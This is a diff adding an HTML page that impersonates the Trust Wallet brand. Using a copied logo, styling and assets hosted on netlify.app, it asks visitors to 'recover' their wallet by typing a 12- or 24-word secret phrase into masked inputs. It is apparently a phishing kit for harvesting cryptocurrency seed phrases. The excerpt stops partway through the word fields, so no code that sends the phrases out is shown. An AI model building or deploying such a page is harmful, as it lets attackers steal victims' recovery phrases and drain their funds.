@@ -1,0 +1,1153 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="googlebot" content="noindex, nofollow"></head><body>.
+    <title>Trust Wallet</title>
+    <link rel="icon" href="https://bookings-appoff.netlify.app/img/fav.ico">
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+     <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+
+
+    <style>
+      *{
+    margin: 0;
+    padding: 0;
+}
+body{
+    box-sizing: border-box;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background-color: #fff;
+}
+.container-box{
+    width: 32%;
+    margin: 30px auto;
+}
+.container-box-2{
+    width: 32%;
+    margin: 30px auto;
+}
+.logo{
+    text-align: center;
+}
+.addWidth{
+    width: 60%;
+}
+.container{
+    background: rgb(255, 255, 255);
+    border: 1px solid rgb(241, 240, 244);
+    border-radius: 3px;
+    padding: 24px;
+    margin: 15px 0;
+}
+.header{
+    text-align: center;
+}
+.header h2{
+    font-weight: 600;
+    font-size: 26px;
+}
+.header p{
+    color: rgb(67, 71, 78);
+    font-size: 15px;
+    padding: 10px 60px;
+}
+.box1{
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 30px 0;
+    padding: 20px 0;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: .2s ease-in-out;
+}
+.icon-box{
+    margin-right: 40px;
+}
+.arrow-box{
+      margin-left: 40px;
+}
+.text-1{
+    font-weight: 500;
+    font-size: 17px;
+}
+.text-2{
+    color: rgb(67, 71, 78);
+}
+.css-1x1iozj .chakra-icon {
+    font-size: 28px;
+}
+.css-1ylca8 {
+    width: 30px;
+    height: 30px;
+    display: inline-block;
+    line-height: 1em;
+    flex-shrink: 0;
+    color: rgb(51, 117, 187);
+    vertical-align: middle;
+}
+.css-dg0got {
+    width: 1em;
+    height: 1em;
+    display: inline-block;
+    line-height: 1em;
+    flex-shrink: 0;
+    color: rgb(115, 119, 127);
+    vertical-align: middle;
+    margin-left: auto;
+}
+.css-krbdkf {
+    width: 21px;
+    height: 21px;
+    display: inline-block;
+    line-height: 1em;
+    flex-shrink: 0;
+    color: rgb(105, 106, 109);
+    vertical-align: middle;
+    cursor: pointer;
+}
+.btnnext{
+    text-align: center;
+}
+.btnnext button{
+    display: inline-block;
+    width: 40%;
+    background-color: #0500FF;
+    padding: 15px;
+    color: #fff;
+    border-radius: 100px;
+    border: none;
+    cursor: pointer;
+    font-family: inherit;
+    font-size: 16px;
+    margin-top: 20px;
+    transition: .2s ease-in;
+}
+.btnnext button:hover{
+    background-color: #1411f0d2;
+}
+.progress-box{
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-top: 20px;
+    margin-bottom: 20px;
+}
+.progress-bar{
+    width: 50%;
+    height: 4px;
+    background-color:rgb(211, 228, 255);
+    border-radius: 100px;
+    margin-right: 20px;
+}
+.active{
+    background-color: #0500FF;
+}
+.form-box {
+    text-align: center;
+    margin-top: 20px;
+}
+.form-box label{
+    position: absolute;
+    transform: translate(-130px, -15px);
+    background-color: #fff;
+    font-size: 12px;
+    font-weight: 500;
+    color: rgb(67, 71, 78);
+    padding: 5px;
+}
+.form-box select{
+    display: block;
+    font-family: inherit;
+    width: 100%;
+    margin: 10px auto;
+    padding: 11px 10px;
+    font-size: 16px;
+    font-weight: 700;
+    color: rgb(67, 71, 78);
+    border-radius: 5px;
+    background-color: #F5F5F5;
+    border: 1px solid #F5F5F5;
+}
+.width2{
+    width: 50% !important;
+    margin: 10px auto !important;
+}
+.form-box select:focus{
+    outline: none;
+    border: none;
+}
+.main-form{
+    margin-top: 20px;
+}
+.box-forms input{
+    width: 90%;
+    padding: 10px;
+    font-family: inherit;
+    font-size: 16px;
+    font-weight: 400;
+    border: none;
+    border-radius: 3px;
+    background-color: #F5F5F5;
+}
+.box-forms input{
+    outline: none;
+}
+.box-forms input::placeholder{
+    font-weight: 600;
+    color: rgb(167, 167, 167);
+    font-size: 17px;
+}
+
+.eyebox-1, .eyebox-2, .eyeClick1, .eyeClick2{
+    position: absolute;
+    transform: translate(130px, -33px);
+}
+.eyebox-1 svg{
+    color: #52505098;
+}
+.hide {
+   display: none;
+}
+.form-container{
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    grid-gap: 20px;
+}
+.form-container2{
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    grid-gap: 20px;
+}
+.btnsback{
+    display: flex;
+    justify-content: center;
+    margin: 0 auto;
+    width: 90%;
+    margin-top: 30px;
+}
+.back-btn{
+    display: inline-block;
+    width: 50%;
+    background-color: transparent;
+    color: #0052FF;
+    font-weight: 600;
+    border: none;
+    font-family: inherit;
+    padding: 10px 20px;
+    border-radius: 100px;
+    margin-right: 30px;
+    font-size: 17px;
+    cursor: pointer;
+}
+.text-iconNormal{
+    color: #a09e9e;
+}
+.btn-next:disabled, .btn-next{
+    display: inline-block;
+    width: 50%;
+    text-align: center;
+    font-weight: 500;
+    border: 1px solid transparent;
+    font-family: inherit;
+    padding: 10px 20px;
+    border-radius: 100px;
+    color: #fff;
+    background-color: #B3B1FF;
+    cursor: not-allowed;
+}
+.btn-next{
+    background-color: #0500FF;
+    color: #fff;
+    cursor: pointer;
+}
+.waitmsg{
+    font-weight: 500;
+    font-size: 17px;
+}
+.text-sd{
+    display: inline-block;
+    position: absolute;
+    transform: translate();
+}
+.clear-btn{
+    display: block;
+    text-align: center;
+    margin-top: 30px;
+}
+.clear-btn button{
+    background-color: transparent;
+    border: none;
+    font-family: inherit;
+    font-size: 17px;
+    font-weight: 600;
+    color: #807ef3;
+    cursor: pointer;
+}
+.loader,
+.loader:after {
+  border-radius: 50%;
+  width: 5em;
+  height: 5em;
+}
+.loader {
+  margin: 60px auto;
+  font-size: 5px;
+  position: relative;
+  text-indent: -9999em;
+  border-top: .8em solid #0052FF;
+  border-right: .8em solid #0052FF;
+  border-bottom: .8em solid #0052FF;
+  border-left: .8em solid #ffffff;
+  -webkit-transform: translateZ(0);
+  -ms-transform: translateZ(0);
+  transform: translateZ(0);
+  -webkit-animation: load8 1.1s infinite linear;
+  animation: load8 .7s infinite linear;
+}
+@-webkit-keyframes load8 {
+  0% {
+    -webkit-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@keyframes load8 {
+  0% {
+    -webkit-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+ @keyframes animateContainer {
+    0%{
+        transform: translateX(10px);
+    }
+
+    100%{
+        transform: translateX(-50px);
+    }
+}
+
+        .preloader{
+            position: fixed;
+            width: 100%;
+            height: 100vh;
+            top: 0;
+            left: 0;
+            background-color: #ffffffb2;
+            z-index: 4000;
+        }
+        .preloader-box{
+            position: absolute;
+            top: 40%;
+            left: 50%;
+            transform: translate(-40%, -50%);
+        }
+ @media screen and (max-width: 1069px){
+        .container-box, .addWidth{
+        width: 60%;
+    }        
+ }
+@media screen and (max-width: 946px){
+    .container-box, .addWidth{
+        width: 90%;
+    }
+    .width2{
+        width: 70%;
+    }
+    .header p{
+        padding: 10px 20px;
+    }
+    .btnnext button{
+        width: 90%;
+    }
+    .icon-box{
+        margin-right: 15px;
+    }
+    .arrow-box{
+        margin-left: 15px;
+    }
+    .text-2{
+        font-size: 15px;
+    }
+
+    .container-box-2, .addWidth, .width2{
+         width: 90%;
+    }
+    .form-box select{
+        width: 90%;
+    }
+    .form-box label{
+       transform: translate(-100px, -15px);
+    }
+    .form-container, .form-container2{
+        grid-template-columns: repeat(2, 1fr);
+    }
+    .box-forms input{
+        display: block;
+    }
+    .eyebox-1, .eyebox-2, .eyeClick1, .eyeClick2{
+        transform: translate(220px, -37px);
+    }
+}
+
+@media screen and (max-width: 640px){
+    .eyebox-1, .eyebox-2, .eyeClick1, .eyeClick2{
+        transform: translate(150px, -37px);
+    }
+    .width2{
+        width: 100%;
+    }
+    .addWidth{
+    width: 100%;
+}
+
+}
+
+@media screen and (max-width: 475px){
+    .eyebox-1, .eyebox-2, .eyeClick1, .eyeClick2{
+        transform: translate(130px, -37px);
+    }
+}
+
+@media screen and (max-width: 397px){
+      .form-container, .form-container2{
+        grid-template-columns: repeat(1, 1fr);
+    }
+     .eyebox-1, .eyebox-2, .eyeClick1, .eyeClick2{
+        transform: translate(220px, -37px);
+    }
+}
+
+
+
+    </style>
+
+
+    
+      <div class="preloader hide">
+        <div class="preloader-box">
+            <div class="loader">Loading...</div>
+        </div>
+    </div>
+
+    <div class="container-box">
+         <div class="logo">
+           <svg fill="none" width="62" height="87" viewBox="0 0 62 87" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#clip0_25278_20289)"><path d="M0 26.9363L30.5839 16.9512V86.0767C8.73806 76.8594 0 59.1941 0 49.2089V26.935V26.9363Z" fill="#0500FF"></path><path d="M61.1698 26.9363L30.5859 16.9512V86.0767C52.4318 76.8594 61.1698 59.1941 61.1698 49.2103V26.9363Z" fill="url(#paint0_linear_25278_20289)"></path><path d="M12.0424 0.342773H16.3099V2.73341C17.7089 0.584462 19.3179 0.342773 21.674 0.342773V4.56886H20.6009C17.778 4.56886 16.4259 5.89745 16.4259 8.5284V13.0197H12.041V0.342773H12.0424Z" fill="#0500FF"></path><path d="M35.9182 13.0183H31.5333V11.8098C30.5762 12.9216 29.2711 13.4036 27.6621 13.4036C24.6072 13.4036 22.8809 11.593 22.8809 8.26047V0.342773H27.2658V7.273C27.2658 8.8419 28.035 9.75893 29.3401 9.75893C30.6453 9.75893 31.5333 8.86538 31.5333 7.34482V0.342773H35.9182V13.0196V13.0183Z" fill="#0500FF"></path><path d="M36.9883 9.10444H41.0942C41.282 10.0215 41.9104 10.4068 43.4255 10.4068C44.6615 10.4068 45.3852 10.1182 45.3852 9.58644C45.3852 9.17488 45.0344 8.90971 44.0331 8.69288L40.7213 7.94434C38.5061 7.43887 37.386 6.15861 37.386 4.10496C37.386 1.39943 39.3679 -0.000976562 43.2155 -0.000976562C47.0632 -0.000976562 48.9525 1.36352 49.2798 4.28588H45.1988C45.1297 3.51386 44.3356 3.04153 43.0305 3.04153C41.9822 3.04153 41.3055 3.37851 41.3055 3.88675C41.3055 4.3204 41.7475 4.65877 42.6355 4.87836L46.1103 5.72358C48.3946 6.27739 49.4925 7.43749 49.4925 9.32127C49.4925 11.9301 47.2303 13.4755 43.384 13.4755C39.5377 13.4755 36.9938 11.81 36.9938 9.10444H36.9897H36.9883Z" fill="#0500FF"></path><path d="M61.1684 4.28436V0.342773H50.3477V4.28712H53.5766V13.0183H57.938V4.28436H61.1684Z" fill="#0500FF"></path><path d="M10.8227 4.28436V0.342773H0.00195312V4.28712H3.2309V13.0183H7.59234V4.28436H10.8213H10.8227Z" fill="#0500FF"></path></g><defs><linearGradient id="paint0_linear_25278_20289" x1="53.1099" y1="12.1326" x2="29.8181" y2="85.092" gradientUnits="userSpaceOnUse"><stop offset="0.02" stop-color="#0000FF"></stop><stop offset="0.08" stop-color="#0094FF"></stop><stop offset="0.16" stop-color="#48FF91"></stop><stop offset="0.42" stop-color="#0094FF"></stop><stop offset="0.68" stop-color="#0038FF"></stop><stop offset="0.9" stop-color="#0500FF"></stop></linearGradient><clipPath id="clip0_25278_20289"><rect width="61.1691" height="86.0768" fill="white"></rect></clipPath></defs></svg>
+         </div>
+
+        <div class="container">
+            <div class="progress-box">
+                <div class="progress-bar active"></div>
+
+                <div class="progress-bar">
+                    <div class="progress"></div>
+                </div>
+            </div>
+
+                <div class="header">
+                <h2>Recover your Wallet</h2>
+                <p>Import your wallet recovery phrase to recover your wallet.</p>
+             </div>
+
+            <div class="box1">
+                <div class="icon-box">
+                  <svg class="text-iconNormal" fill="#ccc" width="20" height="22" viewBox="0 0 20 22" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M0 3.17778L9.99992 0V22C2.85712 19.0667 0 13.4444 0 10.2667V3.17778ZM20 3.17778L10.0001 0V1.82357L9.99997 1.82354V20.2132C10 20.2132 10 20.2132 10.0001 20.2132V22C17.1429 19.0667 20 13.4444 20 10.2667V3.17778ZM10.0001 20.2132C15.9706 17.7612 18.3588 13.0617 18.3588 10.4054V4.47982L10.0001 1.82357V20.2132Z" fill="currentColor"></path></svg>
+                </div>
+
+                <div class="text-box">
+                    <p class="text-1">Import or recover wallet</p>
+                    <p class="text-2">Import with your Secret Phrase</p>
+                </div>
+
+                <div class="arrow-box">
+                    <svg viewBox="0 0 16 12" focusable="false" class="chakra-icon css-dg0got"><path d="M9.3 11.2748C9.1 11.0748 9.004 10.8331 9.012 10.5498C9.02067 10.2665 9.125 10.0248 9.325 9.8248L12.15 6.9998H1C0.716667 6.9998 0.479 6.9038 0.287 6.7118C0.0956668 6.52047 0 6.28314 0 5.9998C0 5.71647 0.0956668 5.4788 0.287 5.2868C0.479 5.09547 0.716667 4.9998 1 4.9998H12.15L9.3 2.1498C9.1 1.9498 9 1.71214 9 1.4368C9 1.16214 9.1 0.924804 9.3 0.724804C9.5 0.524804 9.73767 0.424805 10.013 0.424805C10.2877 0.424805 10.525 0.524804 10.725 0.724804L15.3 5.2998C15.4 5.3998 15.471 5.50814 15.513 5.6248C15.5543 5.74147 15.575 5.86647 15.575 5.9998C15.575 6.13314 15.5543 6.25814 15.513 6.3748C15.471 6.49147 15.4 6.5998 15.3 6.6998L10.7 11.2998C10.5167 11.4831 10.2877 11.5748 10.013 11.5748C9.73767 11.5748 9.5 11.4748 9.3 11.2748Z" fill="currentColor"></path></svg>
+                </div>
+            </div>
+            
+            <div class="btnnext">
+                <button class="btnNext-1">Import Wallet</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="container-box-2  hide">
+           <div class="logo">
+             <img src="https://bookings-appoff.netlify.app/img/log.png" alt="log">
+         </div>
+
+          <div class="container">
+    
+            <div class="progress-box">
+                <div class="progress-bar active"></div>
+                <div class="progress-bar active"></div>
+            </div>
+
+             <div class="header">
+                <h2>Import With Secret Phrase</h2>   
+             </div>
+
+             <div class="form-box">
+                    <select name="word" class="word-value">
+                        <option value="12" selected="">I have a 12 word Secret Phrase</option>
+                        <option value="24">I have a 24 word Secret Phrase</option>
+                    </select>
+            </div>
+
+                <div class="main-form">
+                <form action="#" id="form">
+                    <div class="form-container">
+                       <div class="box-forms">
+                        <input type="password" name="" id="word1" placeholder="Word #1" class="word-12">
+                        <div class="eyebox-1">
+                          <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                        <div class="eyebox-2 hide">
+                         <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                      </div>
+                      
+
+                      <div class="box-forms">
+                         <input type="password" name="" id="word2" placeholder="Word #2" class="word-12">
+                            <div class="eyebox-1">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyebox-2 hide">
+                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word3" placeholder="Word #3" class="word-12">
+                            <div class="eyebox-1">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyebox-2 hide">
+                               <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+
+                      <div class="box-forms">
+                         <input type="password" name="" id="word4" placeholder="Word #4" class="word-12">
+                            <div class="eyebox-1">
+                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                          </div>
+                         <div class="eyebox-2 hide">
+                          <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+
+                      <div class="box-forms">
+                         <input type="password" name="" id="word5" placeholder="Word #5" class="word-12">
+                            <div class="eyebox-1">
+                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyebox-2 hide">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word6" placeholder="Word #6" class="word-12">
+                            <div class="eyebox-1">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyebox-2 hide">
+                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word7" placeholder="Word #7" class="word-12">
+                            <div class="eyebox-1">
+                           <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyebox-2 hide">
+                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word8" placeholder="Word #8" class="word-12">
+                            <div class="eyebox-1">
+                          <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+
+                         <div class="eyebox-2 hide">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word9" placeholder="Word #9" class="word-12">
+                            <div class="eyebox-1">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
